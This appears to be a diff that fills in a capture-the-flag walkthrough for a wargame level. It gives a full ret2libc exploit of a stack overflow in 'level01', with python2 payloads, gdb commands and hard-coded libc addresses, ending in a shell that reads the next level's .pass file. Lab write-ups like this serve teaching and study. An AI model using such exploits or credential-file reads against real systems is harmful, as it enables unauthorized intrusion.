@@ -1,19 +1,78 @@
-Level 1 - Walkthrough
-========================
+Level01 - Walkthrough
+=====================
 
 1) Recon
-- Files discovered:
-- Useful commands used:
+--------
+- Connected as `level01` and analyzed binary with `objdump`, `strings`, and `gdb`.
+- Found expected username in static data: `dat_wil`.
+- Located password compare routine in `verify_user_pass`.
+
+Useful commands:
+- `objdump -d ./level01 | less`
+- `strings -n 4 ./level01`
+- `gdb -q ./level01`
 
 2) Vulnerability confirmation
-- What is vulnerable:
-- Why it is exploitable:
+-----------------------------
+- Normal password authentication is broken by bad branch logic in `main`.
+- Even when compare returns success (`res == 0`), code jumps to failure path.
+- Password input uses `fgets(password_buffer, 100, stdin)` with 64-byte buffer.
+- This permits stack overflow and return-address overwrite.
 
 3) Exploitation steps
-- Exact command sequence:
-- Payload used:
+---------------------
+Step A: Prove EIP overwrite
+```sh
+( python2 - <<'PY'
+import sys
+sys.stdout.write("dat_wil\n")
+sys.stdout.write("A"*80 + "BBBB" + "\n")
+PY
+) | ./level01
+```
+Observed: segmentation fault confirms control over return path.
+
+Step B: Find exact offset using cyclic crash
+- Crash with cyclic pattern and read EIP in gdb.
+- Computed offset to saved EIP: `80`.
+
+Step C: Get runtime addresses in gdb
+```gdb
+start
+p system
+p exit
+info proc mappings
+find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+x/s 0xf7f897ec
+```
+Recovered values:
+- `system = 0xf7e6aed0`
+- `exit   = 0xf7e5eb70`
+- `binsh  = 0xf7f897ec`
+
+Step D: Build and send ret2libc payload
+```sh
+( python2 - <<'PY'
+import sys, struct
+sys.stdout.write("dat_wil\n")
+payload = "A"*80
+payload += struct.pack("<I", 0xf7e6aed0)  # system
+payload += struct.pack("<I", 0xf7e5eb70)  # exit
+payload += struct.pack("<I", 0xf7f897ec)  # "/bin/sh"
+sys.stdout.write(payload + "\n")
+PY
+cat ) | ./level01
+```
 
 4) Result
-- Retrieved next password from:
-- Notes for defense/evaluation:
+---------
+- Payload returns into `system("/bin/sh")` and spawns shell.
+- Read next password:
+	- `cat /home/users/level02/.pass`
+
+Notes for defense/evaluation
+----------------------------
+- Explain why correct password alone cannot succeed (logic bug).
+- Explain why shellcode was not used (NX enabled).
+- Explain why ret2libc works (reuse libc + controllable saved EIP).
 
